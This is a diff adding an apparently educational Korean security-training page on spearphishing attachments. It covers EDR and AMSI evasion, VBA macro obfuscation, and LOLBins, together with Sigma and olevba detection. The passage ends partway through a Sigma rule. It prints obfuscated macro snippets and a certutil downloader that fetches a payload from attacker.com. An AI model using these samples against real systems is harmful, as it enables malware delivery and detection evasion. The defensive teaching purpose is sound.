@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="ko" class="light" data-technique-id="T1566.001" data-level="advanced">
+<head>
+    <script>
+        (function() {
+            try {
+                var key = 'sb-bnwbybawqrnhznirivfg-auth-token';
+                var session = sessionStorage.getItem(key);
+                if (!session || !JSON.parse(session)) {
+                    var redirect = encodeURIComponent(window.location.href);
+                    window.location.replace('/login?redirect=' + redirect);
+                }
+            } catch(e) { window.location.replace('/login'); }
+        })();
+    </script>
+    <script>
+        var _eduDynLoaded = false;
+        (async function() {
+            try {
+                var SUPA = 'https://bnwbybawqrnhznirivfg.supabase.co';
+                var KEY  = 'sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';
+                var res = await fetch(SUPA + '/rest/v1/edu_html_content?page_id=eq.t1566-001-spearphishing-attachment-advanced&select=content&limit=1', { headers: { 'apikey': KEY, 'Authorization': 'Bearer ' + KEY } });
+                if (res.ok) { var data = await res.json(); if (data && data.length > 0 && data[0].content) { _eduDynLoaded = true; document.open(); document.write(data[0].content); document.close(); return; } }
+            } catch(e) {}
+            document.documentElement.classList.add('edu-ready');
+        })();
+        setTimeout(function() { if (!_eduDynLoaded) document.documentElement.classList.add('edu-ready'); }, 3000);
+    </script>
+    <style>html:not(.edu-ready) body { visibility: hidden; } html.edu-ready body { visibility: visible; }</style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <title>ROOT14 EDU | T1566.001 고급: 탐지 우회와 재탐지 전략</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { sans: ['Inter','sans-serif'], mono: ['JetBrains Mono','monospace'] }, colors: { cbg:'#FFF8F0', cyel:'#F4D06F', cteal:'#9DD9D2', cdark:'#1e293b', cgray:'#475569' } } } }</script>
+    <style>
+        body { scroll-behavior:smooth; background-color:#FFF8F0; color:#1e293b; transition: background-color 0.3s ease, color 0.3s ease; }
+        .glass-panel { background:rgba(255,255,255,0.7); backdrop-filter:blur(16px); border:1px solid rgba(220,38,38,0.3); box-shadow:0 8px 32px rgba(30,41,59,0.05); }
+        .dark body { background-color:#0f172a; color:#f8fafc; }
+        .dark .glass-panel { background:rgba(30,41,59,0.7); border:1px solid rgba(220,38,38,0.2); box-shadow:0 8px 32px rgba(0,0,0,0.4); }
+        .hl-teal { color:#0f766e; font-weight:700; } .dark .hl-teal { color:#9DD9D2; }
+        .hl-yel { color:#b45309; font-weight:700; } .dark .hl-yel { color:#F4D06F; }
+        .hl-blue { color:#1d4ed8; font-weight:700; } .dark .hl-blue { color:#60a5fa; }
+        .hl-red { color:#dc2626; font-weight:700; } .dark .hl-red { color:#f87171; }
+        .nav-item.active { background:linear-gradient(90deg,rgba(220,38,38,0.2) 0%,transparent 100%); border-left:4px solid #dc2626; color:#dc2626; font-weight:700; }
+        .dark .nav-item.active { background:linear-gradient(90deg,rgba(248,113,113,0.15) 0%,transparent 100%); border-left:4px solid #f87171; color:#f87171; }
+        .terminal-bg { background-color:#1e293b; color:#9DD9D2; font-family:'JetBrains Mono',monospace; }
+        ::-webkit-scrollbar{width:8px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:#dc2626;border-radius:4px;}.dark ::-webkit-scrollbar-thumb{background:#f87171;}
+    </style>
+</head>
+<body class="flex flex-col h-screen overflow-hidden selection:bg-red-200 selection:text-red-900 transition-colors duration-300">
+    <!-- Brand Header Bar -->
+    <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;">
+        <div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:0.25em;">ROOT14</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">ROOT14 Academy · 사이버보안 교육 플랫폼</span></div>
+        <div class="flex items-center gap-3">
+            <span style="font-size:8px;color:#dc2626;font-weight:700;background:rgba(220,38,38,0.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(220,38,38,0.3);">ADVANCED</span>
+            <button onclick="window.location.href='/'" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,0.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">← 매트릭스 대시보드</button>
+        </div>
+    </div>
+
+    <div class="flex flex-1 overflow-hidden">
+    <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-red-400"><span id="theme-icon" class="text-xl">🌙</span></button>
+    <button onclick="window.location.href='/'" class="fixed top-12 left-4 z-50 md:hidden flex items-center gap-1 glass-panel px-3 py-2 rounded-full text-xs font-bold text-slate-700 dark:text-slate-300 border border-red-400/50 hover:border-red-400 shadow transition-all">← 대시보드</button>
+
+    <!-- Sidebar -->
+    <aside class="hidden md:flex w-64 shrink-0 flex-col bg-white/50 dark:bg-slate-900/50 border-r border-slate-200 dark:border-slate-700 overflow-y-auto">
+        <div class="p-4 border-b border-slate-200 dark:border-slate-700">
+            <div class="text-[10px] font-mono text-slate-500 mb-1">T1566.001 · Advanced</div>
+            <h2 class="font-extrabold text-base text-slate-800 dark:text-slate-100 leading-tight">스피어피싱 첨부파일<br><span class="text-red-600 dark:text-red-400">탐지 우회와 재탐지</span></h2>
+        </div>
+        <nav class="flex-1 p-2 space-y-0.5 text-xs">
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch1" onclick="go('ch1')">Ch.1 EDR 우회 기법 개론</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch2" onclick="go('ch2')">Ch.2 AMSI 바이패스 분석</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch3" onclick="go('ch3')">Ch.3 매크로 난독화 기법</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch4" onclick="go('ch4')">Ch.4 Living-off-the-Land 바이너리</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch5" onclick="go('ch5')">Ch.5 Sigma YAML 고급 작성</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch6" onclick="go('ch6')">Ch.6 YARA 고급 규칙</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch7" onclick="go('ch7')">Ch.7 우회 공격 재탐지 전략</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch8" onclick="go('ch8')">Ch.8 Detection Engineering</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch9" onclick="go('ch9')">Ch.9 Threat Hunting 기초</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch10" onclick="go('ch10')">Ch.10 종합 시나리오 분석</a>
+        </nav>
+    </aside>
+
+    <!-- Mobile Nav -->
+    <div class="md:hidden fixed bottom-0 left-0 right-0 z-50 bg-white/95 dark:bg-slate-900/95 backdrop-blur-sm border-t border-slate-200 dark:border-slate-700 px-2 py-1.5 flex gap-1 overflow-x-auto">
+        <button onclick="go('ch1')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.1</button>
+        <button onclick="go('ch2')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.2</button>
+        <button onclick="go('ch3')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.3</button>
+        <button onclick="go('ch4')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.4</button>
+        <button onclick="go('ch5')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.5</button>
+        <button onclick="go('ch6')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.6</button>
+        <button onclick="go('ch7')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.7</button>
+        <button onclick="go('ch8')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.8</button>
+        <button onclick="go('ch9')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.9</button>
+        <button onclick="go('ch10')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.10</button>
+    </div>
+
+    <!-- Main Content -->
+    <main id="main-scroll" class="flex-1 overflow-y-auto scroll-smooth px-4 md:px-8 lg:px-16 py-8 pb-20 md:pb-8">
+
+        <!-- ===================== Ch.1 EDR 우회 기법 개론 ===================== -->
+        <section id="ch1" data-chapter-id="ch1" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">01</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">EDR 우회 기법 개론</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">중급에서 배운 탐지 메커니즘(Sysmon, YARA, ASR)을 공격자가 어떻게 우회하는지 이해하고, 방어자가 이에 대응하는 전략을 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">왜 우회 기법을 배워야 하는가?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">APT 그룹은 단순한 공격 도구를 사용하지 않습니다. <span class="hl-red">탐지 규칙을 연구하고 우회하는 것</span>이 그들의 핵심 역량입니다. 방어자가 우회 기법을 이해하지 못하면, 새로운 변종이 등장할 때마다 무방비 상태가 됩니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">EDR 탐지의 3가지 기둥</h3>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg text-center">
+                        <p class="font-bold text-red-600 dark:text-red-400 text-lg mb-1">Userland Hooking</p>
+                        <p class="text-slate-500 dark:text-slate-400">ntdll.dll 함수 인라인 후킹으로 API 호출 모니터링</p>
+                        <p class="mt-2 text-red-500 font-bold">→ 우회: Direct Syscall</p>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg text-center">
+                        <p class="font-bold text-red-600 dark:text-red-400 text-lg mb-1">ETW (Event Tracing)</p>
+                        <p class="text-slate-500 dark:text-slate-400">커널 이벤트 추적으로 프로세스/네트워크 이벤트 수집</p>
+                        <p class="mt-2 text-red-500 font-bold">→ 우회: ETW Patching</p>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg text-center">
+                        <p class="font-bold text-red-600 dark:text-red-400 text-lg mb-1">Kernel Callbacks</p>
+                        <p class="text-slate-500 dark:text-slate-400">PsSetCreateProcessNotifyRoutine 등 커널 콜백</p>
+                        <p class="mt-2 text-red-500 font-bold">→ 우회: Callback 제거 (드라이버 필요)</p>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">스피어피싱 컨텍스트에서의 우회 시나리오</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">═══ 중급 탐지 vs 고급 우회 매핑 ═══</span>
+
+중급 탐지                           고급 우회
+─────────────────────              ─────────────────────
+SEG 첨부파일 스캔              →   암호화 ZIP + 본문에 비밀번호
+ASR 매크로 차단                →   DDE, SLK, XLL 등 비매크로 실행
+Sysmon 프로세스 체인 탐지      →   프로세스 인젝션 (부모-자식 관계 파괴)
+YARA 패턴 매칭                →   문자열 난독화, 패킹, 암호화 페이로드
+Sigma 로그 탐지               →   LOLBins (정상 바이너리 악용)
+AMSI 스크립트 스캔            →   AMSI 패치 (AmsiScanBuffer 무력화)</pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">⚠️ 교육 목적 안내</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">이 과정의 우회 기법은 <span class="hl-red">방어자가 탐지 규칙의 한계를 이해</span>하기 위한 교육 목적입니다. 실제 환경에서의 무단 사용은 법적 책임을 수반합니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.2 AMSI 바이패스 분석 ===================== -->
+        <section id="ch2" data-chapter-id="ch2" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">02</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">AMSI 바이패스 분석</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">AMSI(Antimalware Scan Interface)의 동작 원리와 공격자의 우회 기법을 분석하고, 이를 탐지하는 방어 전략을 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">AMSI 동작 원리</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">AMSI는 Windows 10+에서 <span class="hl-teal">스크립트 엔진(PowerShell, VBScript, JScript)이 코드를 실행하기 직전</span>에 보안 제품에 스캔을 요청하는 인터페이스입니다. 난독화된 스크립트도 최종 실행 시점에서 평문으로 스캔됩니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">═══ AMSI 스캔 흐름 ═══</span>
+
+PowerShell 스크립트 실행 요청
+       │
+       ▼
+┌─────────────────────────┐
+│ 난독화 해제 (최종 평문)  │
+└─────────────────────────┘
+       │
+       ▼
+┌─────────────────────────┐
+│ AmsiScanBuffer() 호출    │ ← amsi.dll 내 함수
+│ → AV/EDR에 스캔 위임     │
+└─────────────────────────┘
+       │
+       ▼
+  판정: AMSI_RESULT_DETECTED → 실행 차단
+        AMSI_RESULT_CLEAN    → 실행 허용</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">AMSI 바이패스 유형 (방어자 관점)</h3>
+                <div class="space-y-3 text-sm">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400">Type 1: AmsiScanBuffer 패치</p>
+                        <p class="text-slate-500 dark:text-slate-400 mt-1">amsi.dll의 AmsiScanBuffer 함수 시작 부분을 수정하여 항상 AMSI_RESULT_CLEAN을 반환하도록 변조. <span class="hl-blue">탐지:</span> Sysmon Event ID 7 (amsi.dll 로드) + ETW AMSI 이벤트 소실 감지</p>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400">Type 2: amsiInitFailed 강제 설정</p>
+                        <p class="text-slate-500 dark:text-slate-400 mt-1">PowerShell의 내부 변수를 조작하여 AMSI 초기화 실패로 인식시킴. <span class="hl-blue">탐지:</span> ScriptBlock 로그에서 amsi 관련 리플렉션 호출 탐지</p>
+                    </div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400">Type 3: CLM 우회 후 AMSI 비활성</p>
+                        <p class="text-slate-500 dark:text-slate-400 mt-1">Constrained Language Mode를 먼저 우회한 뒤 .NET 리플렉션으로 AMSI를 비활성. <span class="hl-blue">탐지:</span> PowerShell 4104 ScriptBlock 로그 + System.Reflection 키워드</p>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">방어: AMSI 바이패스 탐지 Sigma 규칙</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Sigma: AMSI 바이패스 시도 탐지</span>
+title: AMSI Bypass Attempt via PowerShell
+logsource:
+    product: windows
+    category: ps_script
+    definition: 'PowerShell ScriptBlock Logging (Event ID 4104)'
+detection:
+    selection:
+        ScriptBlockText|contains:
+            - 'AmsiScanBuffer'
+            - 'amsiInitFailed'
+            - 'AmsiUtils'
+            - 'System.Management.Automation.AmsiUtils'
+    condition: selection
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.t1562.001</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.3 매크로 난독화 기법 ===================== -->
+        <section id="ch3" data-chapter-id="ch3" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">03</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">매크로 난독화 기법</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">공격자가 YARA/AV 시그니처를 우회하기 위해 사용하는 VBA 난독화 기법을 분석하고, 이를 탐지하는 방법을 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">난독화 유형별 분석</h3>
+
+                <div class="space-y-4">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400 mb-2">① 문자열 분할 (String Concatenation)</p>
+                        <div class="terminal-bg rounded p-3 text-xs">
+<pre><span style="color:#F4D06F">' 원본 (YARA에서 "powershell" 탐지됨)</span>
+Shell "powershell -enc AAAA..."
+
+<span style="color:#F4D06F">' 난독화 (문자열 분할로 시그니처 우회)</span>
+Dim a As String: a = "pow" & "ers" & "he" & "ll"
+Shell a & " -e" & "nc AA" & "AA..."</pre>
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400 mb-2">② Chr() 함수 인코딩</p>
+                        <div class="terminal-bg rounded p-3 text-xs">
+<pre><span style="color:#F4D06F">' "Shell" 문자열을 Chr() 숫자로 변환</span>
+Dim cmd As String
+cmd = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
+<span style="color:#9DD9D2">' → "Shell" (S=83, h=104, e=101, l=108, l=108)</span>
+
+Application.Run cmd, "calc.exe"</pre>
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-lg">
+                        <p class="font-bold text-red-600 dark:text-red-400 mb-2">③ 환경 변수 / 셀 참조 숨기기</p>
+                        <div class="terminal-bg rounded p-3 text-xs">
+<pre><span style="color:#F4D06F">' Excel: 숨겨진 시트의 셀에 명령어 조각 저장</span>
+<span style="color:#F4D06F">' Hidden_Sheet!A1 = "powershell"</span>
+<span style="color:#F4D06F">' Hidden_Sheet!A2 = "-enc"</span>
+<span style="color:#F4D06F">' Hidden_Sheet!A3 = "base64_payload"</span>
+
+Dim cmd As String
+cmd = Sheets("Hidden_Sheet").Range("A1") & " " & _
+      Sheets("Hidden_Sheet").Range("A2") & " " & _
+      Sheets("Hidden_Sheet").Range("A3")
+Shell cmd</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">방어: olevba 정적 분석으로 난독화 탐지</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># olevba로 난독화된 매크로 분석</span>
+$ olevba --decode obfuscated_doc.docm
+
+<span style="color:#9DD9D2">VBA MACRO ThisDocument.cls</span>
+AutoExec: AutoOpen                        <span style="color:#ef4444">← 자동 실행 트리거</span>
+Suspicious: Shell                         <span style="color:#ef4444">← 시스템 명령 실행</span>
+Suspicious: Chr()                         <span style="color:#ef4444">← 문자열 난독화</span>
+Suspicious: Hex Strings                   <span style="color:#ef4444">← 16진수 인코딩</span>
+IOC: "powershell" (deobfuscated)          <span style="color:#ef4444">← 난독화 해제 결과</span></pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">난독화는 <span class="hl-teal">정적 시그니처 탐지</span>를 우회하지만, <span class="hl-blue">동적 행위 분석</span>(샌드박스, EDR)과 <span class="hl-red">olevba 디코딩</span>을 동시에 우회하기는 어렵습니다. 다층 분석이 핵심입니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.4 Living-off-the-Land 바이너리 ===================== -->
+        <section id="ch4" data-chapter-id="ch4" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">04</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Living-off-the-Land 바이너리</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">LOLBins(Living off the Land Binaries)의 개념을 이해하고, 피싱 공격에서 악용되는 주요 바이너리와 탐지 방법을 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">LOLBins란?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300"><span class="hl-red">LOLBins</span>는 Windows에 기본 설치된 정상 바이너리를 공격 목적으로 악용하는 기법입니다. 서명된 Microsoft 바이너리이므로 AV/EDR 화이트리스트를 통과하며, 공격자가 별도 도구를 다운로드할 필요가 없습니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">피싱에서 자주 악용되는 LOLBins</h3>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left font-bold">바이너리</th>
+                            <th class="p-2 text-left font-bold">정상 용도</th>
+                            <th class="p-2 text-left font-bold">악용 방식</th>
+                            <th class="p-2 text-left font-bold">MITRE ATT&CK</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-mono">certutil.exe</td><td class="p-2">인증서 관리</td><td class="p-2">파일 다운로드 (-urlcache)</td><td class="p-2">T1105</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-mono">mshta.exe</td><td class="p-2">HTA 실행</td><td class="p-2">스크립트 실행 (proxy execution)</td><td class="p-2">T1218.005</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-mono">regsvr32.exe</td><td class="p-2">COM 등록</td><td class="p-2">원격 SCT 파일 실행 (/s /u /i)</td><td class="p-2">T1218.010</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2 font-mono">rundll32.exe</td><td class="p-2">DLL 실행</td><td class="p-2">악성 DLL 로드</td><td class="p-2">T1218.011</td></tr>
+                            <tr><td class="p-2 font-mono">bitsadmin.exe</td><td class="p-2">백그라운드 전송</td><td class="p-2">파일 다운로드 (/transfer)</td><td class="p-2">T1197</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">피싱 시나리오: 매크로 → certutil 다운로더</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">' VBA 매크로 (cmd.exe 대신 certutil 사용)</span>
+Sub AutoOpen()
+    <span style="color:#9DD9D2">' ASR 규칙이 cmd.exe/powershell.exe를 차단하므로</span>
+    <span style="color:#9DD9D2">' certutil.exe를 사용하여 우회 시도</span>
+    Shell "certutil -urlcache -split -f " & _
+          "http://attacker.com/payload.exe " & _
+          "C:\Users\Public\update.exe"
+End Sub
+
+<span style="color:#F4D06F">═══ Sysmon 탐지 ═══</span>
+Event ID 1: ParentImage=WINWORD.EXE → Image=certutil.exe
+            CommandLine: certutil -urlcache -split -f http://...
+Event ID 3: certutil.exe → attacker.com:80 (아웃바운드)</pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 방어 전략</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">LOLBins 탐지의 핵심은 <span class="hl-blue">"정상 바이너리의 비정상 사용 패턴"</span>을 찾는 것입니다. certutil이 -urlcache와 함께 사용되거나, mshta가 원격 URL을 로드하는 것은 정상 업무에서 거의 발생하지 않습니다. LOLBAS Project(lolbas-project.github.io)에서 전체 목록을 참조할 수 있습니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.5 Sigma YAML 고급 작성 ===================== -->
+        <section id="ch5" data-chapter-id="ch5" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">05</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Sigma YAML 고급 작성</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">중급의 기본 Sigma 규칙을 확장하여, 다중 조건, 시간 윈도우, 집계(aggregation)를 사용하는 고급 탐지 규칙을 작성합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">고급 Sigma: 다중 이벤트 상관분석</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># 고급 Sigma: Office → LOLBin 체인 탐지 (우회 패턴 포함)</span>
+title: Office Application Spawns LOLBin - Advanced Evasion Detection
+id: a1b2c3d4-5678-9012-3456-789012345678
+status: stable
+description: >
+    Office 앱이 cmd/powershell 외에 certutil, mshta, regsvr32 등
+    LOLBin을 생성하는 패턴을 탐지합니다.
+    고급 공격자가 ASR 규칙을 우회하기 위해 사용하는 대안 바이너리입니다.
+
+logsource:
+    category: process_creation
+    product: windows
+
+detection:
+    <span style="color:#9DD9D2">selection_parent:</span>
+        ParentImage|endswith:
+            - '\WINWORD.EXE'
+            - '\EXCEL.EXE'
+            - '\POWERPNT.EXE'
+
+    <span style="color:#9DD9D2">selection_lolbin:</span>
+        Image|endswith:
+            - '\certutil.exe'
+            - '\mshta.exe'
+            - '\regsvr32.exe'
+            - '\rundll32.exe'
+            - '\bitsadmin.exe'
+            - '\wmic.exe'
+            - '\cmstp.exe'
+
+    <span style="color:#9DD9D2">selection_suspicious_args:</span>
+        CommandLine|contains:
+            - '-urlcache'
+            - 'http://'
+            - 'https://'
+            - '/i:http'
+            - '/transfer'
+
